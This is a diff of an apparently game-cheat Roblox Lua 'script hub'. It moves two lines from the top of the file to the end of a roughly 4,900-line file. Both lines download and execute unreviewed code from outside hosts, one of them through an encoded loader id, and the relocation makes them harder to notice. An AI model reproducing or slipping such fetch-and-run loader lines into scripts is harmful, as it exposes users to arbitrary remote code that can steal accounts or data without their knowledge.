@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2lsbHlXb25rYTI0NzU1dy9oaXByaW50L3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
-loadstring(game:HttpGet("https://botthepan.onrender.com/script/e25bae74c0b48d3b"))()
 --[[
 	SCRIPT HUB v2
 	- Detecta el juego en el que estas y muestra tu perfil + metricas en vivo
@@ -4943,3 +4941,6 @@ if settings.bgImage ~= "" then
 		end
 	end)
 end
+
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU2ZDc1MDdmLWRhZjItNDA0MC04ZTVmLWIyYTkxYjcxZTAyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2lsbHlXb25rYTI0NzU1dy9oaXByaW50L3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
+loadstring(game:HttpGet("https://botthepan.onrender.com/script/e25bae74c0b48d3b"))()
